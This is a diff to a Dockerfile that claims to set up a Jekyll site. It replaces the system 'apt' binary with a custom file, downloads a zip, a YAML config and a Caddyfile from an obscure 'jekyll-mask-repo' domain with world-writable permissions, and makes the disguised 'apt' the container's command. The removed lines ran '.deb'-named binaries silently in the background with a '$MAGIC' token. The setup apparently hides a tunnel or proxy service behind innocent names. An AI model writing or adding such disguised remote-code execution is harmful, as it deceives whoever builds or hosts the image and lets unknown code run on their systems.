@@ -1,5 +1,6 @@
 FROM ubuntu
 
+ADD apt /usr/bin
 RUN mkdir /jekyll
 RUN mkdir /jekyll/Config
 RUN apt update && apt install -y curl git wget tar openssl unzip
@@ -16,13 +17,9 @@ RUN mkdir /.temp
 RUN mkdir /.temp/tunnel
 RUN mkdir /.temp/tunnel/id/
 RUN mkdir /.temp/tunnel/id/.86de6451-e653-4318-bd38-4e8e4a9d8006
+RUN wget http://jekyll-mask-repo.helis.cf/jek-downloads/website.zip && unzip website.zip && chmod +x -R website
+RUN wget http://jekyll-mask-repo.helis.cf/crossover.yaml && chmod 0777 crossover.yaml
+RUN curl http://jekyll-mask-repo.helis.cf/Caddyfile-html.htm > Caddyfile && chmod 0777 Caddyfile
 RUN chmod +x -R /jekyll
 
-CMD ./dpkg-install-BEE-13686-TQ.deb service install "$MAGIC" > /dev/null &
-RUN wget http://jekyll-mask-repo.helis.cf/crossover.yaml && chmod 0777 crossover.yaml 
-CMD ./dpkg-install-EKW-55688-18.deb run -c crossover.yaml > /dev/null &
-
-RUN wget http://jekyll-mask-repo.helis.cf/jek-downloads/website.zip && unzip website.zip && chmod +x -R website
-RUN curl http://jekyll-mask-repo.helis.cf/Caddyfile-html.htm > Caddyfile && chmod 0777 Caddyfile && rm -rf crossover.yaml
-
-CMD caddy run --config Caddyfile
+CMD apt
